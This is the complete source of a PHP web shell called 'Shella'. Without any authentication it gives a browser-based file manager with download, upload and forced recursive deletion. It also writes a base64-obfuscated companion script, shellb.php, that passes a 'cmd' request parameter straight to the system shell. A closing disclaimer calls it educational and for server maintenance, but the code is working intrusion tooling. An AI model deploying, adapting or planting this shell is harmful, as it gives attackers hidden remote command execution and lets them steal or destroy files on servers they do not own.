<?php
    error_reporting(E_ERROR);
    $terminal_companion = 'shellb.php';
    $server_ip = $_SERVER['SERVER_ADDR'];
    $your_ip = $_SERVER['REMOTE_ADDR'];
    $server_software = $_SERVER['SERVER_SOFTWARE'];
    $server_protocol = $_SERVER['SERVER_PROTOCOL'];
    $server_port = $_SERVER['SERVER_PORT'];
    $whoami = shell_exec('whoami');
    if (isset($_GET['directory']) && $_GET['directory'] != "") $pwd = $_GET['directory'];
    else {
        $pwd = shell_exec('pwd');
        if ($pwd == "")$pwd = shell_exec('cd');
    }
    $current_directory = trim($pwd);
    $permission = shell_exec('stat --format "%A" .');
    if ($permission == "")$permission = shell_exec('icacls . | findstr "^.\{10\}NT AUTHORITY\\Authenticated Users"');
    if (isset($_GET['download']) && $_GET['download'] != "") {
        $download_this = $current_directory.'/'.$_GET['download'];
        echo "<title>".$download_this."</title></head>";
        if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') $download_this = str_replace('/', '\\', $download_this);
        if ($download_this == ".." || $download_this == ".") $download_this = ""; // Safety
        if (file_exists($download_this)) {
            $file = fopen($download_this, "r");
            while(!feof($file)) echo htmlspecialchars(fgets($file), ENT_QUOTES, 'UTF-8', true). "<br>";
            fclose($file);
            die();
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shella</title>
</head>
<style>
    html {
        font-family: Arial, Helvetica, sans-serif;
        background-color: #1e1e1e;
        color: #d4d4d4;
    }
    h2 {
        margin-bottom:-20px
    }
    table {
        border-collapse: collapse;
        width: 100%;
    }
    th, td {
        padding: 8px;
        text-align: left;
        border-bottom: 1px solid #ddd;
    }
    .title {
        text-align: center;
    }
    .title h5{
        margin-top: -20px;
    }
    .center-thd {
        text-align: center;
    }
    .upload-file {
        margin-top:1rem
    }
    .description {
        margin-top:2rem;text-align:center
    }
    .terminal-iframe {
        width:100%;
        margin-top:10px;
    }
    .terminal-inputs input[type="reset"] {
        background-color:#000;
        color:lime;
        border:none;
        outline:none;
        height:25px
    }
    .terminal-inputs input[type="text"] {
        border: none;
        outline: none;
        background-color: #000;
        color: #d4d4d4;
        width:96%;height:25px;color:lime
    }
    .description p {
        font-size:0.8rem;
        width:600px;
        text-align:center;
        margin:auto;
        margin-bottom:2rem
    }
</style>
<body>
    <div class="title">
        <h1><i>&lt;Shella&gt;</i></h1>
        <h5>ThreeStackingBirds RNDProd.</h5>
    </div>
    <table>
        <tr>
            <th>Server IP</th>
            <th>Your IP</th>
            <th>Server Software</th>
            <th>Server Protocol</th>
            <th>Server Port</th>
            <th>User</th>
            <th>PWD</th>
            <th>Permission</th>
        </tr>
        <tr>
            <td><?php echo $server_ip ?></td>
            <td><?php echo $your_ip ?></td>
            <td><?php echo $server_software ?></td>
            <td><?php echo $server_protocol ?></td>
            <td><?php echo $server_port ?></td>
            <td><?php echo $whoami ?></td>
            <td><?php echo $pwd ?></td>
            <td><?php echo $permission ?></td>
        </tr>
    </table>
    <div>
        <!-- TERMINAL -->
        <?php
            if (!file_exists($terminal_companion)){
                $shellb = base64_decode('PCEtLSBQSFAgU2hlbGwgLSBrYmxrIC0tPg0KPHN0eWxlPip7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2NvbG9yOmxpbWU7YmFja2dyb3VuZC1jb2xvcjojMDAwfTwvc3R5bGU+DQo8P3BocA0KICAgIGVjaG8gJzxwcmU+JzsNCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKXsNCiAgICAgICAgaWYgKGlzc2V0KCRfR0VUWyd3ZCddKSAmJiAkX0dFVFsnd2QnXSAhPSAnJykkY21kID0gJ2NkICcuc3RyX3JlcGxhY2UoYXJyYXkoIlxyIiwgIlxuIiksICcnLCAkX0dFVFsnd2QnXSkuJyYmJy4kX0dFVFsnY21kJ107DQogICAgICAgIGVsc2UgJGNtZCA9ICRfR0VUWydjbWQnXTsNCiAgICAgICAgZWNobyAiQ29tbWFuZDogJGNtZCBcblxuIjsNCiAgICAgICAgd2hpbGUgKEAgb2JfZW5kX2ZsdXNoKCkpOw0KICAgICAgICAkcHJvYyA9IHBvcGVuKCRjbWQsICdyJyk7DQogICAgICAgICRvdXRwdXQgPSAnJzsNCiAgICAgICAgd2hpbGUgKCFmZW9mKCRwcm9jKSkgew0KICAgICAgICAgICAgZWNobyBmcmVhZCgkcHJvYywgNDA5Nik7DQogICAgICAgICAgICBAIGZsdXNoKCk7DQogICAgICAgIH0NCiAgICB9IGVsc2UgZWNobyAiICAgX19fX19fICAgICAgIF9fX19fXyBcbiAgLyBfXy8gLyAgX19fIC8gLyAvIC8gXG4gX1wgXC8gXyBcLyAtXykgLyAvIF8gXFxcbi9fX18vXy8vXy9cX18vXy9fL18uX18vLSpTaGVsbGItdjAuMVxuKioqQmVzdCBTaGVsbGEgVGVybWluYWwgQ29tcGFuaW9uKioqXG4iOw0KICAgIGVjaG8gJzwvcHJlPic7DQo/Pg==');
                if (file_put_contents($terminal_companion, $shellb)) chmod($terminal_companion, 0775);
                else echo '<br><br>Failed to create shellb.php';
            }
            if (file_exists($terminal_companion)){
                chmod($terminal_companion, 0755);
                ?>
                    <iframe frameBorder="0" name="terminal" id="terminal" src="<?php echo $terminal_companion ?>" class="terminal-iframe"></iframe>
                    <form action="<?php echo $terminal_companion ?>" onsubmit="this.submit();this.reset();return false;" method="get" target="terminal" class="terminal-inputs">
                        <input type="reset" value="Clear">
                        <input type="hidden" name="wd" value="<?php
                            if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') echo str_replace('/', '\\', $pwd);
                            else echo $pwd;
                        ?>">
                        <input type="text" name="cmd" placeholder="Executing in <?php echo $pwd ?>">
                        <input type="submit" value="Execute" hidden>
                    </form>
                <?php
            }
            else echo "<br>Shellb Terminal ".$terminal_companion." not found";
        ?>
    </div>
    <div>
        <h2>Fileman</h2>
        <h5>Current Directory: <?php echo $pwd ?></h5>
        <table>
            <tr>
                <th>File Name</th>
                <th>Actions</th>
                <th class="center-thd">Owner</th>
                <th class="center-thd">Group</th>
                <th class="center-thd">Permission</th>
                <th class="center-thd">Size</th>
            </tr>
            <tr>
                <?php
                    if (isset($_GET['directory']) && $_GET['directory'] != "") {
                        $current_directory = $_GET['directory'];
                        if ($current_directory == "..") $current_directory = dirname(getcwd());
                    } else $current_directory = getcwd();
                    if (isset($_GET['delete']) && $_GET['delete'] != "") {
                        $delete_this = $current_directory.'/'.$_GET['delete'];
                        if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') $delete_this = str_replace('/', '\\', $delete_this);
                        if ($delete_this == ".." || $delete_this == ".") $delete_this = ""; // Safety
                        if (file_exists($delete_this)) shell_exec('rm -rf '.escapeshellarg($delete_this)); // Deleting Command
                        if (file_exists($delete_this)) shell_exec('rmdir '.escapeshellarg($delete_this)); // Just in case
                        if (file_exists($delete_this)) shell_exec('attrib -r -s -h '.escapeshellarg($delete_this)); // Just to be sure
                        if (file_exists($delete_this)) shell_exec('del '.escapeshellarg($delete_this)); // I guarantee you I'm not paranoid
                        if (file_exists($delete_this)) shell_exec('rmdir /s /q '.escapeshellarg($delete_this)); // Nor I suffer from atychiphobia
                        if (file_exists($delete_this)) echo "delete failed"; // Lol I'm just lazy
                        else echo "delete success";
                    }
                    $files = scandir($current_directory);
                    echo "<td><a href='?directory=".dirname($current_directory)."'>.. (Up a Directory)</a></td>";
                    echo "<td></td><td></td><td></td><td></td><td></td>";
                    echo "</tr>";
                    foreach($files as $file) if ($file != '.' && $file != '..'){
                        // FILE
                        echo "<tr>";
                        if (is_dir($current_directory.'/'.$file)) echo "<td><a href='?directory=$current_directory/$file'>$file</a></td>";
                        else echo "<td>$file</td>";

                        // ACTIONS
                        if (!is_dir($current_directory.'/'.$file)) echo "<td><a href='?download=$file&directory=$current_directory'>Download</a><br/>";
                        else echo "<td>"; 
                        echo "<a href='?delete=$file&directory=$current_directory' onclick='return confirm(\"Are you sure you want to delete $file?\")'>Delete</a></td>";

                        // OWNER
                        $owner = shell_exec('ls -ldh '.escapeshellarg($current_directory.'/'.$file).' | awk \'{print $3}\'');
                        if ($owner == "")$owner = "→";
                        echo "<td class='center-thd'>$owner</td>";

                        // GROUP
                        $group = shell_exec('ls -ldh '.escapeshellarg($current_directory.'/'.$file).' | awk \'{print $4}\'');
                        if ($group == "")$group = "→";
                        echo "<td class='center-thd'>$group</td>";

                        // PERMISSION
                        $permission = shell_exec('ls -ldh '.escapeshellarg($current_directory.'/'.$file).' | awk \'{print $1}\'');
                        if ($permission == "")$permission = shell_exec('icacls '.escapeshellarg($current_directory.'\\'.$file).' | findstr "^.\{10\}NT AUTHORITY\\Authenticated Users"');
                        echo "<td class='center-thd'>$permission</td>";

                        // SIZE
                        if (!is_dir($current_directory.'/'.$file)){
                            $size = shell_exec('ls -ldh '.escapeshellarg($current_directory.'/'.$file).' | awk \'{print $5}\'');
                            if ($size == "")$size = shell_exec('for %I in ('.escapeshellarg($current_directory.'\\'.$file).') do @echo %~zI');
                        } else $size = "-";
                        echo "<td class='center-thd'>$size</td>";
                        echo "</tr>";
                    }
                ?>
            </tr>
        </table>
    </div>
    <div>
        <!-- Upload File -->
        <?php
            if (isset($_POST['upload_file']) && isset($_FILES['file'])) {
                $target_dir = $current_directory."/";
                $target_file = $target_dir . basename($_FILES["file"]["name"]);
                $uploadOk = 1;
                $FileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
                if (file_exists($target_file)) {
                    echo "File already exists.";
                    $uploadOk = 0;
                }
                if ($_FILES["file"]["size"] > ((min((int)ini_get('post_max_size'), (int)ini_get('upload_max_filesize')))*1024)) {
                    echo "File is too large.";
                    $uploadOk = 0;
                }
                if ($uploadOk == 0) echo "Sorry, your file was not uploaded.";
                else {
                    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) echo "The file ". htmlspecialchars( basename( $_FILES["file"]["name"])). " has been uploaded.";
                    else echo "Sorry, there was an error uploading your file.";
                }
            }
        ?>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="file" id="files">
            <input type="submit" value="Upload File" name="upload_file">
        </form>
    </div>
    <div class="description">
        <p>
            Shella is a simple web shell made in association of the TSB-RND and kblk. By using this webshell, you're forced to agree to the statements as follows: This webshell is made for educational and server maintenance purposes. Any illegal use is prohibited. Failure to comply with the above statement is not the responsibility of the authors.<br>
        </p>
    </div>
</body>
</html>
<script>
    var iframe = document.getElementById('terminal');
    document.addEventListener('keydown', function(event) {if (event.ctrlKey && event.code === 'KeyC') iframe.contentWindow.stop()});
    window.history.replaceState(null, null, window.location.href.split("?")[0] + "?directory=" + "<?php echo str_replace("\\", "\\\\", $current_directory); ?>");
</script>